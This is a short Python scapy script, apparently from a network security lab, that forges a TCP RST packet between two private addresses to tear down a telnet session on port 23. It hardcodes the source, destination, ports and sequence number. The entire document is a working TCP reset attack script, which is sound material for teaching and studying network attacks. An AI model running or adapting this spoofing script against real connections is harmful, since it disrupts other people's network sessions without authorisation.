from scapy.all import *

# create IP and TCP headers for the spoofed RST packet
ip = IP(src="10.0.2.15", dst="10.0.2.4")
tcp = TCP(sport=23, dport=33978, flags="R", seq=2011996360)
pkt = ip/tcp

# send the spoofed RST packet and capture the response packet
ls(pkt)
send(pkt, verbose=0)

